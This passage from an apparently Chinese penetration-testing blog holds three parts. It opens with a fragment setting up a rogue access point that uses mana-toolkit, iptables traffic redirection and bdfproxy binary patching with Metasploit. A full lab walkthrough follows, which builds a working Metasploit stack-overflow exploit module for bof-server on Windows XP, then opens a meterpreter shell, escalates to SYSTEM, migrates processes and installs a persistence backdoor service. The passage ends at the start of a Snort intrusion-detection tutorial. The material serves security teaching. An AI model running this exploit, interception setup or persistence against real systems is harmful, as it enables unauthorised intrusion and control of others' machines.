<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#修改无线网卡适配器并启动</span></span><br><span class="line"><span class="built_in">cd</span> /usr/share/mana-toolkit/run-mana/ <span class="comment">#这里有很多脚本</span></span><br><span class="line"><span class="built_in">cp</span> start-nat-simple.sh mana.sh <span class="comment">#选择start-nat-simple.sh并不破坏他</span></span><br><span class="line">vi mana.sh</span><br><span class="line">phy=wlan0 <span class="comment">#修改为插入的无线网卡名</span></span><br><span class="line">iptables -F <span class="comment">#清空</span></span><br><span class="line">iptables -t nat -F</span><br><span class="line">iptables -t nat -A PREROUTING -i <span class="variable">$phy</span> -p tcp --dport 80 -j REDIRECT --to-ports 8080</span><br><span class="line">iptables -t nat -A PREROUTING -i <span class="variable">$phy</span> -p tcp --dport 443 -j REDIRECT --to-ports 8080</span><br><span class="line"><span class="comment">#别的iptables都删掉</span></span><br><span class="line">./mana.sh</span><br><span class="line"><span class="comment">#插入无线网卡</span></span><br><span class="line"><span class="comment">#修改 IP 转发</span></span><br><span class="line">sysctl -w net.ipv4.ip_forward=1</span><br><span class="line"><span class="comment">#修改侦听 IP 地址并启动 bdfproxy</span></span><br><span class="line">vi /etc/bdfproxy/bdfproxy.cfg</span><br><span class="line">proxyMode = transparent</span><br><span class="line">bdfproxy</span><br><span class="line"><span class="comment">#启动 msf</span></span><br><span class="line">msfconsole -r /usr/share/bdfproxy/bdfproxy_msf_resource.rc</span><br></pre></td></tr></table></figure>
<p>操作和ARP的差不多，，，略，，，</p>
]]></content>
      <categories>
        <category>Kail Linux渗透测试</category>
        <category>免杀</category>
      </categories>
      <tags>
        <tag>shell</tag>
        <tag>免杀</tag>
      </tags>
  </entry>
  <entry>
    <title>使用 Metasploit 实现对栈的缓冲区溢出</title>
    <url>/2021/11/25/%E4%BD%BF%E7%94%A8%20Metasploit%20%E5%AE%9E%E7%8E%B0%E5%AF%B9%E6%A0%88%E7%9A%84%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/</url>
    <content><![CDATA[<h2 id="实验环境">1. 实验环境</h2>
<p><strong>攻击机：kali 2019-3</strong></p>
<p><strong>靶机：winXPSP3</strong></p>
<p><strong>漏洞：bof-server 缓冲区溢出漏洞</strong></p>
<h2 id="缓冲区溢出漏洞">2. 缓冲区溢出漏洞</h2>
<h3 id="漏洞溢出图示">1、漏洞溢出图示</h3>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211125082356267-2142446906.png" /></p>
<h3 id="利用思路">2、利用思路</h3>
<p>如果我们知道了用来保存EIP的起始地址前面的数据长度，那么就可以将任意数据保存到原来EIP的位置，从而控制所要执行的下一条指令的地址</p>
<h2 id="bof-server-介绍">3. bof-server 介绍</h2>
<p><strong>下载地址：</strong>
https://redstack.net/blog/category/How%20To.html</p>
<p>这个小程序在 <strong>200端口</strong>
上提供TCP服务。向这个200端口执行 <strong>TELNET</strong>
连接，然后提供随机数据，这个过程如下图所示</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211125082535599-436215531.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211125082552053-791026234.png" /></p>
<p>发送以上数据之后，目标 bof-server 程序会 <strong>崩溃</strong>
，具体情况如下</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211125082617760-2123977968.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211125082624701-183636359.png" /></p>
<p><strong>分析</strong></p>
<p>程序无法在地址41414141处找到下一条要执行的指令，从而导致了程序崩溃。这里面能找到一些蛛丝马迹吗？值41是字符A的16进制表示，
A也正是我们输入的字符，它们超出了缓冲区的范围，接着覆盖了EIP寄存器。由于下一条指令的地址被重写，程序就试图按照这个41414141地址去寻找下一条要执行的指令，但这显然不是一个有效的地址，所以程序崩溃了。</p>
<h2 id="构建该渗透模块的基础">4. 构建该渗透模块的基础</h2>
<ul>
<li><strong>偏移量（ offset）</strong></li>
</ul>
<p>为了渗透这个应用程序，需要确定填满缓冲区和EBP寄存器所需字节的准确长度，在这个长度后面的内容就会被保存到EIP寄存器中。我们将未填充进EIP寄存器的数据长度称为偏移量</p>
<ul>
<li><strong>跳转地址（ jump address/ret）</strong></li>
</ul>
<p>用来重写EIP寄存器的一个地址，通常是一个DLL文件的JMP
ESP指令，可以让程序跳转到攻击载荷所在的地址</p>
<ul>
<li><strong>坏字符（ bad character）</strong></li>
</ul>
<p>坏字符指的是那些可能导致攻击载荷终止的字符。假设一个ShellCode中存在null字节（
0x00），那么它在网络传输的过程中就可能导致缓冲过早结束，从而出现意想不到的结果。应尽量避免坏字符</p>
<h2 id="渗透前期准备">5. 渗透前期准备</h2>
<h3 id="流程">1、流程</h3>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211125083038603-248476432.png" /></p>
<ol type="1">
<li><p>使用用户输入填充EIP寄存器起始地址之前的缓冲区和EBP寄存器。</p></li>
<li><p>使用JMP ESP的地址来改写EIP。</p></li>
<li><p>在攻击载荷之前提供一些填充数据。</p></li>
<li><p>删除攻击载荷本身的坏字节。</p></li>
</ol>
<h3 id="计算偏移量">2、计算偏移量</h3>
<p><strong>Metasploit中的pattern_create工具</strong></p>
<ul>
<li>它产生了可以代替字符A进行填充的字符序列，基于这个序列就可以改写EIP寄存器中的值</li>
<li>使用/tools/exploit/目录下面的pattern_create.rb脚本生成一个1000字节的字符序列</li>
</ul>
<p><strong>使用</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:/usr/share/metasploit-framework/tools/exploit<span class="comment"># ./pattern_create.rb -l 1000</span></span><br><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B</span><br><span class="line">root@kali:/usr/share/metasploit-framework/tools/exploit<span class="comment">#</span></span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211125083230035-797930941.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211125083241944-815891189.png" /></p>
<p><strong>Metasploit中的pattern_offset工具</strong></p>
<ul>
<li>计算改写EIP所需的确切字节数量</li>
<li>已经得知用来改写EIP内容的地址为72413372</li>
</ul>
<p><strong>使用</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:/usr/share/metasploit-framework/tools/exploit<span class="comment"># ./pattern_offset.rb -q 72413372 -l 1000</span></span><br><span class="line">[*] Exact match at offset 520</span><br></pre></td></tr></table></figure>
<p><strong>偏移量：520</strong></p>
<h3 id="查找-jmp-esp-地址">3、查找 JMP ESP 地址</h3>
<p>需要这个JMPESP指令的地址，是因为我们通过ESP寄存器来
<strong>载入攻击载荷</strong>
，而不是在填充满缓冲区之后简单地找到攻击载荷。因此，需要从一个外部的DLL文件得到JMP
ESP指令的地址，这个DLL文件将会使程序跳转到ESP中的地址，而这正是攻击载荷的起始地址。</p>
<h4
id="使用ollydbg调试器查找可执行模块immunity也可">（1）使用OllyDBG调试器查找可执行模块（immunity也可）</h4>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211125083559423-2072302807.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211125083615093-150762306.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211125083628845-1120739729.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211125083637464-1346778930.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211125083648807-2096306879.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211125083658868-1371789401.png" /></p>
<h4 id="利用msfbinscan计算jmp-esp-地址">（2）利用msfbinscan计算JMP ESP
地址</h4>
<p><strong>帮助信息</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf5 &gt; msfbinscan -h</span><br><span class="line">[*] <span class="built_in">exec</span>: msfbinscan -h</span><br><span class="line"></span><br><span class="line">Usage: /usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/bin/msfbinscan [mode] &lt;options&gt; [targets]</span><br><span class="line"></span><br><span class="line">Modes:</span><br><span class="line">-j, --jump [regA,regB,regC] Search <span class="keyword">for</span> jump equivalent instructions [PE|ELF|MACHO]</span><br><span class="line">-p, --poppopret Search <span class="keyword">for</span> pop+pop+ret combinations [PE|ELF|MACHO]</span><br><span class="line">-r, --regex [regex] Search <span class="keyword">for</span> regex match [PE|ELF|MACHO]</span><br><span class="line">-a, --analyze-address [address] Display the code at the specified address [PE|ELF]</span><br><span class="line">-b, --analyze-offset [offset] Display the code at the specified offset [PE|ELF]</span><br><span class="line">-f, --fingerprint Attempt to identify the packer/compiler [PE]</span><br><span class="line">-i, --info Display detailed information about the image [PE]</span><br><span class="line">…………</span><br></pre></td></tr></table></figure>
<p><strong>计算：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf5 &gt; msfbinscan -j esp /root/Desktop/ws2_32.dll</span><br><span class="line">[*] <span class="built_in">exec</span>: msfbinscan -j esp /root/Desktop/ws2_32.dll</span><br><span class="line">[/root/Desktop/ws2_32.dll]</span><br><span class="line">**0x71ab2b53** **push esp; ret**</span><br><span class="line">msf5 &gt;</span><br></pre></td></tr></table></figure>
<p><strong>JMP ESP 地址：0x71ab2b53</strong></p>
<h3 id="填充空间"><strong>4、填充空间</strong></h3>
<p>ShellCode有时可能不在ESP所指向的内存地址。在这种情况下，往往在EIP和ESP之间会隔着一段区域，而我们需要使用随机数据或者NOP来填充这个区域。也就是说，攻击载荷中的变量空间是一定的，加载进去的攻击载荷不一定恰好占满所分配（留置）的变量空间，所以才需填充（个人理解，不一定正确）。</p>
<p>NOP指的是 <strong>不进行任何操作</strong> 的指令。它的任务
<strong>仅仅是使程序在没有完成任何操作的状态下执行到下一个内存地址。</strong></p>
<h3 id="确定空间限制"><strong>5、</strong> 确定空间限制</h3>
<p>攻击载荷中的变量空间确定了用于载入ShellCode的空间大小。我们需要为载入的攻击载荷中的ShellCode安排足够的空间。如果攻击载荷很大，但是分配的空间却小于ShellCode，它将无法执行。另外，当编写自定义模块时，
ShellCode越小越好。我们可能会遇到这样一种情况，一个可用的ShellCode需要至少800字节，但是可用空间只有200字节。这种情况下，可以先在缓冲区中载入第一个较小的ShellCode，然后再下载和执行第二个较大的ShellCode，这样就可以完成整个渗透过程。</p>
<p><strong>ShellCode 更多信息</strong>
：http://www.shellstorm.org/shellcode/</p>
<h2 id="编写-metasploit-的渗透模块并测试">6. 编写 Metasploit
的渗透模块并测试</h2>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211125084616820-1437258027.png" /></p>
<h3 id="渗透代码">1、渗透代码</h3>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MetasploitModule</span> &lt; <span class="title class_ inherited__">Msf::Exploit::Remote</span></span><br><span class="line">　　<span class="title class_">Rank</span> = <span class="title class_">NormalRanking</span></span><br><span class="line">　　<span class="keyword">include</span> <span class="title class_">Msf::Exploit::Remote::Tcp</span></span><br><span class="line">　　<span class="keyword">def</span> <span class="title function_">initialize</span>(<span class="params">info = &#123;&#125;</span>)</span><br><span class="line">　　　　<span class="variable language_">super</span>(update_info(info,</span><br><span class="line">　　　　　　<span class="string">&#x27;Name&#x27;</span> =&gt; <span class="string">&#x27;Stack Based Buffer Overflow Example&#x27;</span>,</span><br><span class="line">　　　　　　<span class="string">&#x27;Description&#x27;</span> =&gt; <span class="string">%q&#123;</span></span><br><span class="line"><span class="string">　　　　　　　　Stack Based Overflow Example Application Exploitation Module</span></span><br><span class="line"><span class="string">　　　　　　&#125;</span>,</span><br><span class="line">　　　　　　<span class="string">&#x27;Platform&#x27;</span> =&gt; <span class="string">&#x27;win&#x27;</span>,</span><br><span class="line">　　　　　　<span class="string">&#x27;Author&#x27;</span> =&gt;</span><br><span class="line">　　　　　　[</span><br><span class="line">　　　　　　　　<span class="string">&#x27;…………&#x27;</span></span><br><span class="line">　　　　　　],</span><br><span class="line">　　　　　　<span class="string">&#x27;Payload&#x27;</span> =&gt;</span><br><span class="line">　　　　　　&#123;</span><br><span class="line">　　　　　　　　<span class="string">&#x27;space&#x27;</span> =&gt; <span class="number">1000</span>,</span><br><span class="line">　　　　　　　　<span class="string">&#x27;BadChars&#x27;</span> =&gt; <span class="string">&quot;\x00\xff&quot;</span>,</span><br><span class="line">　　　　　　&#125;,</span><br><span class="line">　　　　　　<span class="string">&#x27;Targets&#x27;</span> =&gt;</span><br><span class="line">　　　　　　[</span><br><span class="line">　　　　　　　　[<span class="string">&#x27;Windows XP SP3&#x27;</span>,&#123; <span class="string">&#x27;Ret&#x27;</span> =&gt; <span class="number">0x71ab2b53</span>, <span class="string">&#x27;Offset&#x27;</span> =&gt;<span class="number">520</span>&#125;]</span><br><span class="line">　　　　　　],</span><br><span class="line">　　　　　　<span class="string">&#x27;DisclosureDate&#x27;</span> =&gt; <span class="string">&#x27;Apr 19 2016&#x27;</span></span><br><span class="line">　　　　))</span><br><span class="line">　　register_options(</span><br><span class="line">　　[</span><br><span class="line">　　　　<span class="title class_">Opt</span><span class="symbol">:</span><span class="symbol">:RPORT</span>(<span class="number">200</span>)</span><br><span class="line">　　])</span><br><span class="line">　　<span class="keyword">end</span></span><br><span class="line">　　<span class="keyword">def</span> <span class="title function_">exploit</span></span><br><span class="line">　　　　connect</span><br><span class="line">　　　　buf = make_nops(target[<span class="string">&#x27;Offset&#x27;</span>])</span><br><span class="line">　　　　buf = buf + [target[<span class="string">&#x27;Ret&#x27;</span>]].pack(<span class="string">&#x27;V&#x27;</span>) + make_nops(<span class="number">20</span>) + payload.encoded</span><br><span class="line">　　　　handler</span><br><span class="line">　　　　disconnect</span><br><span class="line">　　<span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
<h3 id="代码分析">2、代码分析</h3>
<p>（1）将模块的类型定义为Msf::Exploit::Remote，这表示一个远程渗透模块</p>
<p>（2）库文件</p>
<p>Msf::Exploit::Remote::Tcp，TCP库文件提供了基础的TCP函数，例如连接、断开、写数据等</p>
<p>（3）函数介绍</p>
<p><strong>initialize 补充</strong></p>
<ul>
<li><strong>platform win</strong>
定义了渗透模块所适用的目标平台，值设为win表示该渗透模块可以应用在Windows类型的操作系统上</li>
<li><strong>disclosureDate Apr 19 2016</strong> 披露漏洞的时间</li>
<li><strong>targets Ret: 0x71AB2B53 Ret</strong>
字段给出特定操作系统中JMP ESP的地址，这个地址的值在上一节中已经找到</li>
<li><strong>targets Offset: 520</strong>
偏移量字段给出了在特定操作系统中填充EIP之前的缓冲区所需要的字节数量，在上一节中已经找到了这个值</li>
<li><strong>payload Space: 1000</strong>
攻击载荷中的变量space定义了可以使用的最大空间。这一点十分重要，因为有时候需要在非常有限的空间中加载ShellCode</li>
<li>**payload BadChars: *
攻击载荷中的变量BadChars定义了在产生攻击载荷时要避免的坏字符。对坏字符的声明可以保证稳定性，而且便于删除这些容易引起应用程序崩溃或者攻击载荷失效的坏字符</li>
</ul>
<p><strong>exploit 相关</strong></p>
<ul>
<li><strong>make_nops</strong>
，通过传递过来的参数n的值创建相同数量的NOP</li>
<li><strong>connect</strong> ，建立与目标的连接</li>
<li><strong>disconnect</strong> ，切断与目标已建立的连接</li>
<li><strong>handler，</strong>
将连接传递给相关的攻击载荷handler，以检查渗透模块是否成功执行、连接是否建立</li>
</ul>
<p><strong>综述</strong></p>
<p>首先使用connect函数连接目标，然后使用make_nops函数生成520个NOP（
520这个数值由初始化部分target声明中的Offset字段决定）。将这520个NOP保存到buf变量中。在接下来的一条指令中，将JMP
ESP的地址保存到buf（这个地址的值由初始化部分target声明中Ret字段决定）中。使用pack('V')就可以将这个地址转换为小端模式。紧接着向Ret地址中添加少量NOP作为ShellCode的填充。使用Metasploit的优势之一就是可以动态地切换攻击载荷，使用payload.encoded可以将选中的攻击载荷添加到buf变量中。使用sock.put函数将buf的值发送到已连接的目标上。然后运行handler方法检查目标是否已经被成功渗透，以及是否成功建立了一个连接。最后，使用disconnect断开和目标的连接。</p>
<h3 id="代码调试">3、代码调试</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:/usr/share/metasploit-framework/modules/exploits/windows/wins<span class="comment"># /usr/share/metasploit-framework/tools/dev/msftidy.rb test.rb</span></span><br><span class="line">test.rb - [WARNING] Explicitly requiring/loading msf/core is not necessary</span><br><span class="line">test.rb - [INFO] No CVE references found. Please check before you land!</span><br><span class="line">test.rb - [WARNING] Explicitly using self.class <span class="keyword">in</span> register_* is not necessary</span><br><span class="line">root@kali:/usr/share/metasploit-framework/modules/exploits/windows/wins<span class="comment">#</span></span><br></pre></td></tr></table></figure>
<ul>
<li><strong>根据提示，可以删除require 'msf/core'
和self.class（主要是由于版本原因）</strong></li>
</ul>
<h3 id="运行测试">4、运行测试</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf5 &gt; use exploit/windows/wins/test</span><br><span class="line">msf5 exploit(windows/wins/test) &gt; <span class="built_in">set</span> rhosts 10.10.10.131</span><br><span class="line">rhosts =&gt; 10.10.10.131</span><br><span class="line">msf5 exploit(windows/wins/test) &gt; <span class="built_in">set</span> payload windows/meterpreter/bind_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/bind_tcp</span><br><span class="line">msf5 exploit(windows/wins/test) &gt; show options</span><br><span class="line">Module options (exploit/windows/wins/test):</span><br><span class="line"></span><br><span class="line">Name Current Setting Required Description</span><br><span class="line">---- --------------- -------- -----------</span><br><span class="line">RHOSTS 10.10.10.131 <span class="built_in">yes</span> The target address range or CIDR identifier</span><br><span class="line">RPORT 200 <span class="built_in">yes</span> The target port (TCP)</span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/bind_tcp):</span><br><span class="line"></span><br><span class="line">Name Current Setting Required Description</span><br><span class="line">---- --------------- -------- -----------</span><br><span class="line">EXITFUNC process <span class="built_in">yes</span> Exit technique (Accepted: <span class="string">&#x27;&#x27;</span>, seh, thread, process, none)</span><br><span class="line">LPORT 4444 <span class="built_in">yes</span> The listen port</span><br><span class="line">RHOST 10.10.10.131 no The target address</span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">Id Name</span><br><span class="line">-- ----</span><br><span class="line">0 Windows XP SP3</span><br><span class="line">msf5 exploit(windows/wins/test) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started <span class="built_in">bind</span> TCP handler against 10.10.10.131:4444</span><br><span class="line">[*] Sending stage (179779 bytes) to 10.10.10.131</span><br><span class="line">[*] Meterpreter session 1 opened (10.10.10.143:34205 -&gt; 10.10.10.131:4444) at 2021-09-22 08:49:04 -0400</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: DH-CA8822AB9589\Administrator</span><br><span class="line">meterpreter &gt; getsystem</span><br><span class="line">...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).</span><br><span class="line">meterpreter &gt; ps</span><br><span class="line">Process List</span><br><span class="line">============</span><br><span class="line"></span><br><span class="line">PID PPID Name Arch Session User Path</span><br><span class="line">--- ---- ---- ---- ------- ---- ----</span><br><span class="line">0 0 [System Process]</span><br><span class="line">4 0 System x86 0 NT AUTHORITY\SYSTEM</span><br><span class="line">216 1964 VMwareTray.exe x86 0 DH-CA8822AB9589\Administrator C:\Program Files\VMware\VMware Tools\VMwareTray.exe</span><br><span class="line">232 1964 VMwareUser.exe x86 0 DH-CA8822AB9589\Administrator C:\Program Files\VMware\VMware Tools\VMwareUser.exe</span><br><span class="line">244 1964 ICQLite.exe x86 0 DH-CA8822AB9589\Administrator C:\Program Files\ICQLite\ICQLite.exe</span><br><span class="line">452 708 HistorySvr.exe x86 0 NT AUTHORITY\SYSTEM C:\Program Files\KingView\HistorySvr.exe</span><br><span class="line">472 708 inetinfo.exe x86 0 NT AUTHORITY\SYSTEM C:\WINDOWS\system32\inetsrv\inetinfo.exe</span><br><span class="line">524 708 sntlkeyssrvr.exe x86 0 NT AUTHORITY\SYSTEM C:\Program Files\Common Files\SafeNet Sentinel\Sentinel Keys Server\sntlkeyssrvr.exe</span><br><span class="line">592 4 smss.exe x86 0 NT AUTHORITY\SYSTEM \SystemRoot\System32\smss.exe</span><br><span class="line">640 592 csrss.exe x86 0 NT AUTHORITY\SYSTEM \??\C:\WINDOWS\system32\csrss.exe</span><br><span class="line">664 592 winlogon.exe x86 0 NT AUTHORITY\SYSTEM \??\C:\WINDOWS\system32\winlogon.exe</span><br><span class="line">708 664 services.exe x86 0 NT AUTHORITY\SYSTEM C:\WINDOWS\system32\services.exe</span><br><span class="line">720 664 lsass.exe x86 0 NT AUTHORITY\SYSTEM C:\WINDOWS\system32\lsass.exe</span><br><span class="line">880 708 vmacthlp.exe x86 0 NT AUTHORITY\SYSTEM C:\Program Files\VMware\VMware Tools\vmacthlp.exe</span><br><span class="line">892 708 svchost.exe x86 0 NT AUTHORITY\SYSTEM C:\WINDOWS\system32\svchost.exe</span><br><span class="line">972 708 svchost.exe x86 0 NT AUTHORITY\NETWORK SERVICE C:\WINDOWS\system32\svchost.exe</span><br><span class="line">1088 708 svchost.exe x86 0 NT AUTHORITY\SYSTEM C:\WINDOWS\System32\svchost.exe</span><br><span class="line">1136 708 svchost.exe x86 0 NT AUTHORITY\NETWORK SERVICE C:\WINDOWS\system32\svchost.exe</span><br><span class="line">1240 708 spnsrvnt.exe x86 0 NT AUTHORITY\SYSTEM C:\Program Files\Common Files\SafeNet Sentinel\Sentinel Protection Server\WinNT\spnsrvnt.exe</span><br><span class="line">1252 708 svchost.exe x86 0 NT AUTHORITY\LOCAL SERVICE C:\WINDOWS\system32\svchost.exe</span><br><span class="line">1324 708 vmtoolsd.exe x86 0 NT AUTHORITY\SYSTEM C:\Program Files\VMware\VMware Tools\vmtoolsd.exe</span><br><span class="line">1428 708 spoolsv.exe x86 0 NT AUTHORITY\SYSTEM C:\WINDOWS\system32\spoolsv.exe</span><br><span class="line">1544 1964 cmd.exe x86 0 DH-CA8822AB9589\Administrator C:\WINDOWS\system32\cmd.exe</span><br><span class="line">1704 708 VMUpgradeHelper.exe x86 0 NT AUTHORITY\SYSTEM C:\Program Files\VMware\VMware Tools\VMUpgradeHelper.exe</span><br><span class="line">1932 1544 bof-server.exe x86 0 DH-CA8822AB9589\Administrator C:\Documents and Settings\Administrator\Desktop\bof-server.exe</span><br><span class="line">1964 1900 explorer.exe x86 0 DH-CA8822AB9589\Administrator C:\WINDOWS\Explorer.EXE</span><br><span class="line">2084 708 alg.exe x86 0 NT AUTHORITY\LOCAL SERVICE C:\WINDOWS\System32\alg.exe</span><br><span class="line">2872 1088 wscntfy.exe x86 0 DH-CA8822AB9589\Administrator C:\WINDOWS\system32\wscntfy.exe</span><br><span class="line">meterpreter &gt; migrate 1964</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] Migrating from 2604 to 1964...</span><br><span class="line">[*] Migration completed successfully.</span><br><span class="line">meterpreter &gt; run metsvc -A</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.</span><br><span class="line">[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]</span><br><span class="line">[*] Creating a meterpreter service on port 31337</span><br><span class="line">[*] Creating a temporary installation directory C:\DOCUME~1\ADMINI~1\LOCALS~1\Temp\yVnRvlvC...</span><br><span class="line">[*] &gt;&gt; Uploading metsrv.x86.dll...</span><br><span class="line">[*] &gt;&gt; Uploading metsvc-server.exe...</span><br><span class="line">[*] &gt;&gt; Uploading metsvc.exe...</span><br><span class="line">[*] Starting the service...</span><br><span class="line">* Installing service metsvc</span><br><span class="line">* Starting service</span><br><span class="line">Service metsvc successfully installed.</span><br><span class="line"></span><br><span class="line">[*] Trying to connect to the Meterpreter service at 10.10.10.131:31337...</span><br><span class="line">meterpreter &gt; [*] Meterpreter session 4 opened (10.10.10.143:41079 -&gt; 10.10.10.131:31337) at 2021-09-22 09:02:09 -0400</span><br><span class="line">[*] 10.10.10.131 - Meterpreter session 4 closed. Reason: Died</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure>
<p><strong>结果图示</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211125084654894-2009281705.png" /></p>
]]></content>
      <categories>
        <category>精通Metasploit渗透测试 第2版</category>
      </categories>
      <tags>
        <tag>缓冲区溢出</tag>
        <tag>Metasploit</tag>
      </tags>
  </entry>
  <entry>
    <title>基于Snort的入侵检测系统构建</title>
    <url>/2022/07/07/%E5%9F%BA%E4%BA%8Esnort%E7%9A%84%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E7%B3%BB%E7%BB%9F%E6%9E%84%E5%BB%BA/</url>
    <content><![CDATA[<h2 id="基本介绍">1. 基本介绍</h2>
<h3 id="snort">1、Snort</h3>
<p>Snort是一个基于规则的开源网络入侵检测和预防软件(NIDS/NIPS)。Snort主要有三种模式，嗅探器模式，它简单地从网络中读取数据包并在控制台（屏幕）上以连续流的形式输出显示它们。数据包记录器模式，将数据包记录到磁盘。网络入侵检测系统（NIDS）模式，它对网络流量进行检测和分析。Snort带有用于检测攻击的大型规则库，也允许用户使用自己的规则扩展该库。
Snort
3具有高度的灵活性和可配置性，可适应多种不同的情况，并且具有新的插件体系结构，允许开发人员创建自己的插件，以便在Snort的处理管道中使用。与Snort
2相比，Snort 3是对Snort产品的完全重新设计，以解决Snort
2.9.x的一些限制。主要特点是多线程、可扩展的插件架构、基于lua的配置文件、命令行shell和许多其他特性。</p>
<h3 id="splunk">2、Splunk</h3>
<p>Splunk是机器数据的引擎。通过该引擎，用户可以收集、索引应用程序、服务器和设备生成的快速移动的计算机数据。使用Splunk处理计算机数据可在几分钟内解决问题并调查安全事件。Splunk以较低的成本满足合规性要求，可以跨多个系统关联并分析复杂事件。
Splunk的特点：多平台支持、可以从任意源索引任意数据、可以从远程系统转发数据、能够关联复杂事件、Splunk专为大型数据构建、Splunk在整个数据中心扩展、提供角色型的安全性。Splunk可以创建临时报告，以监控安全事件和攻击，分析用户交易，客户行为，机器行为，安全威胁，欺诈活动等。</p>
<h2 id="snort-3安装部署">2. Snort 3安装部署</h2>
<h3 id="基本环境部署">1、基本环境部署</h3>
<h4 id="安装ubuntu-20.04虚拟机">1.1安装Ubuntu 20.04虚拟机</h4>
<p>镜像：<a
